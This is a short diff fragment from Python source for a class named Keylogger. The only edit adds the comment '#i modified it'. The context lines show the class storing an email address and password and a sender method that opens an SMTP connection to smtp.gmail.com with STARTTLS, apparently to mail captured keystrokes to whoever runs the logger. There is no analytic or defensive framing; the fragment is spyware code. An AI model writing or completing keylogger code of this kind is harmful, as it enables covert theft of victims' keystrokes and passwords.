@@ -10,7 +10,7 @@ class Keylogger():
     self.email=email
     self.password=password
     self.start()
-  
+  #i modified it
   def sender(self, email, password, message):
     server=smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
